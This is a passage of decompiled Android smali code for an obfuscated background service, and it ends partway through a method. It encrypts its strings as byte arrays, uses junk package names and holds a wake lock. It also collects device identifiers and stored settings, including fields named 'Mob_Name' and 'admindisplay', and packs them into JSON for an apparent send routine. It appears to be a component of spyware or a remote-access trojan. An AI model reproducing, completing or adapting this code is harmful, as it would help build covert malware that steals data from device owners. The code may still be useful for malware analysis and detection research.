.class public Lcom/vknnolqo/p9sv5zvf/CtKus0KT;
.super Landroid/app/Service;
.source "SourceFile"


# static fields
.field private static d:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ov;

.field private static e:Landroid/os/PowerManager$WakeLock;

.field private static f:Landroid/content/Context;

.field private static final g:Ljava/util/concurrent/ExecutorService;

.field private static final h:Ljava/lang/Object;

.field public static volatile i:Z

.field public static j:Z


# instance fields
.field private b:Landroid/os/Handler;

.field private final c:Ljava/lang/Runnable;


# direct methods
.method static constructor <clinit>()V
    .locals 8

    new-instance v7, Ljava/util/concurrent/ThreadPoolExecutor;

    const/4 v1, 0x4

    const/16 v2, 0x8

    const-wide/16 v3, 0x3c

    sget-object v5, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    new-instance v6, Ljava/util/concurrent/LinkedBlockingQueue;

    const/16 v0, 0x64

    invoke-direct {v6, v0}, Ljava/util/concurrent/LinkedBlockingQueue;-><init>(I)V

    move-object v0, v7

    invoke-direct/range {v0 .. v6}, Ljava/util/concurrent/ThreadPoolExecutor;-><init>(IIJLjava/util/concurrent/TimeUnit;Ljava/util/concurrent/BlockingQueue;)V

    sput-object v7, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->g:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->h:Ljava/lang/Object;

    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->i:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->j:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT$a;

    invoke-direct {v0, p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT$a;-><init>(Lcom/vknnolqo/p9sv5zvf/CtKus0KT;)V

    iput-object v0, p0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->c:Ljava/lang/Runnable;

    return-void
.end method

.method private static synthetic A(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 5

    .line 1
    const/4 v0, 0x2

    :try_start_0
    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    if-nez p0, :cond_0

    return-void

    :cond_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const/4 v2, 0x3

    new-array v3, v2, [B

    fill-array-data v3, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p0, 0x5

    new-array p0, p0, [B

    fill-array-data p0, :array_6

    new-array v3, v1, [B

    fill-array-data v3, :array_7

    invoke-static {p0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    const/16 v3, 0xa

    new-array v3, v3, [B

    fill-array-data v3, :array_8

    new-array v4, v1, [B

    fill-array-data v4, :array_9

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, p0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p0, 0x4

    new-array p0, p0, [B

    fill-array-data p0, :array_a

    new-array v3, v1, [B

    fill-array-data v3, :array_b

    invoke-static {p0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p0, v2, [B

    fill-array-data p0, :array_c

    new-array p1, v1, [B

    fill-array-data p1, :array_d

    invoke-static {p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p0, v2, [B

    fill-array-data p0, :array_e

    new-array p1, v1, [B

    fill-array-data p1, :array_f

    invoke-static {p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->E(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    :array_0
    .array-data 1
        0x24t
        0x3at
    .end array-data

    nop

    :array_1
    .array-data 1
        0x6dt
        0x7et
        -0x17t
        0x6bt
        -0x4et
        0x35t
        0x5ft
        -0x3dt
    .end array-data

    :array_2
    .array-data 1
        0x48t
        0x78t
        0x40t
        -0x68t
        0x5at
        -0x27t
        -0x34t
        0x4at
    .end array-data

    :array_3
    .array-data 1
        0xct
        0x1dt
        0x36t
        -0xft
        0x39t
        -0x44t
        -0x5bt
        0x2et
    .end array-data

    :array_4
    .array-data 1
        -0x67t
        -0xdt
        0x47t
    .end array-data

    :array_5
    .array-data 1
        -0x17t
        -0x66t
        0x23t
        -0x26t
        0x78t
        0x2at
        -0x7et
        -0x9t
    .end array-data

    :array_6
    .array-data 1
        0x5ct
        -0x1ct
        0x70t
        0x21t
        0x4ft
    .end array-data

    nop

    :array_7
    .array-data 1
        0x35t
        -0x70t
        0x9t
        0x51t
        0x2at
        0xat
        0x1bt
        -0x52t
    .end array-data

    :array_8
    .array-data 1
        -0x1dt
        -0x7ct
        -0x43t
        -0x1ft
        0x38t
        -0x9t
        -0x58t
        -0x5bt
        -0x22t
        -0x64t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x50t
        -0x18t
        -0x31t
        -0x42t
        0x5bt
        -0x65t
        -0x3ft
        -0x40t
    .end array-data

    :array_a
    .array-data 1
        0x5at
        0x62t
        0x26t
        -0x2ct
    .end array-data

    :array_b
    .array-data 1
        0x29t
        0x17t
        0x44t
        -0x49t
        -0x1ft
        0x12t
        0xft
        0xct
    .end array-data

    :array_c
    .array-data 1
        -0x63t
        0x57t
        -0x61t
    .end array-data

    :array_d
    .array-data 1
        -0x10t
        0x24t
        -0x8t
        -0x48t
        0x5dt
        0x56t
        0x1ft
        0x7et
    .end array-data

    :array_e
    .array-data 1
        -0xdt
        0x14t
        0xat
    .end array-data

    :array_f
    .array-data 1
        -0x7dt
        0x60t
        0x62t
        0x21t
        0x47t
        0x5ft
        -0x32t
        0x2et
    .end array-data
.end method

.method private static C(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)[Ljava/lang/String;
    .locals 20

    .line 1
    move-object/from16 v0, p0

    const/4 v1, 0x2

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sget-object v4, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Mob_Name:Ljava/lang/String;

    invoke-static {v0, v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->l()Ljava/lang/String;

    move-result-object v7

    invoke-static/range {p0 .. p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    invoke-static/range {p0 .. p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-static/range {p0 .. p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->f(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-static/range {p0 .. p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->w(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v11

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v3, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v2, v3, [B

    fill-array-data v2, :array_4

    new-array v3, v3, [B

    fill-array-data v3, :array_5

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const/16 v1, 0x2d

    const/4 v2, 0x1

    invoke-static {v0, v1, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->m(Landroid/content/Context;IIZ)Ljava/lang/String;

    move-result-object v13

    sget-object v15, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p00;->b:Ljava/lang/String;

    invoke-static/range {p0 .. p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->j(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v16

    sget-object v17, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->admindisplay:Ljava/lang/String;

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->u()Ljava/lang/String;

    move-result-object v18

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->t()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v5, p1

    move-object/from16 v14, p2

    filled-new-array/range {v5 .. v19}, [Ljava/lang/String;

    move-result-object v0

    return-object v0

    nop

    :array_0
    .array-data 1
        -0x48t
        -0x75t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x5t
        -0x3bt
        -0x13t
        0x4at
        0x74t
        0x32t
        0x2bt
        0x50t
    .end array-data

    :array_2
    .array-data 1
        -0x57t
        -0x80t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x20t
        -0x3ct
        0x38t
        -0x38t
        -0x4ft
        0xet
        0x7ft
        -0x8t
    .end array-data

    :array_4
    .array-data 1
        -0x42t
        -0x34t
        -0x48t
        0x4t
        -0x2dt
        -0xft
        0x9t
        0x37t
    .end array-data

    :array_5
    .array-data 1
        -0x6t
        -0x57t
        -0x32t
        0x6dt
        -0x50t
        -0x6ct
        0x60t
        0x53t
    .end array-data
.end method

.method public static D()V
    .locals 25

    .line 1
    const-string v0, ""

    :try_start_0
    sget-object v1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    invoke-static {v1, v0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->d:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ov;

    invoke-virtual {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ov;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v3, 0x3

    new-array v3, v3, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->v(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    sget-object v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->Q:Ljava/lang/String;

    invoke-static {v2, v3, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/16 v3, 0x9

    new-array v7, v3, [B

    fill-array-data v7, :array_2

    new-array v8, v4, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {v2, v7, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v8, v4, [B

    fill-array-data v8, :array_5

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v3, 0x6

    new-array v9, v3, [B

    fill-array-data v9, :array_6

    new-array v10, v4, [B

    fill-array-data v10, :array_7

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-static {v2, v9, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v10, 0x7

    new-array v11, v10, [B

    fill-array-data v11, :array_8

    new-array v12, v4, [B

    fill-array-data v12, :array_9

    invoke-static {v11, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-static {v2, v11, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sget-object v11, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v12, v3, [B

    fill-array-data v12, :array_a

    new-array v13, v4, [B

    fill-array-data v13, :array_b

    invoke-static {v12, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    sget-object v12, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v13, v10, [B

    fill-array-data v13, :array_c

    new-array v14, v4, [B

    fill-array-data v14, :array_d

    invoke-static {v13, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13

    invoke-static {v12, v13, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    sget-object v13, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v14, v4, [B

    fill-array-data v14, :array_e

    new-array v15, v4, [B

    fill-array-data v15, :array_f

    invoke-static {v14, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v14

    invoke-static {v13, v14, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    sget-object v14, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v15, v10, [B

    fill-array-data v15, :array_10

    new-array v3, v4, [B

    fill-array-data v3, :array_11

    invoke-static {v15, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v14, v3, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v15, v10, [B

    fill-array-data v15, :array_12

    new-array v10, v4, [B

    fill-array-data v10, :array_13

    invoke-static {v15, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-static {v3, v10, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v10, 0x7

    new-array v10, v10, [B

    fill-array-data v10, :array_14

    move-object/from16 v24, v1

    new-array v1, v4, [B

    fill-array-data v1, :array_15

    invoke-static {v10, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/16 v10, 0xa

    new-array v10, v10, [B

    fill-array-data v10, :array_16

    move-object/from16 v17, v1

    new-array v1, v4, [B

    fill-array-data v1, :array_17

    invoke-static {v10, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v10, 0x6

    new-array v10, v10, [B

    fill-array-data v10, :array_18

    move-object/from16 v18, v1

    new-array v1, v4, [B

    fill-array-data v1, :array_19

    invoke-static {v10, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v10, 0x5

    new-array v4, v10, [B

    fill-array-data v4, :array_1a

    move-object/from16 v19, v1

    const/16 v10, 0x8

    new-array v1, v10, [B

    fill-array-data v1, :array_1b

    invoke-static {v4, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v4, 0x5

    new-array v10, v4, [B

    fill-array-data v10, :array_1c

    move-object/from16 v20, v1

    const/16 v4, 0x8

    new-array v1, v4, [B

    fill-array-data v1, :array_1d

    invoke-static {v10, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

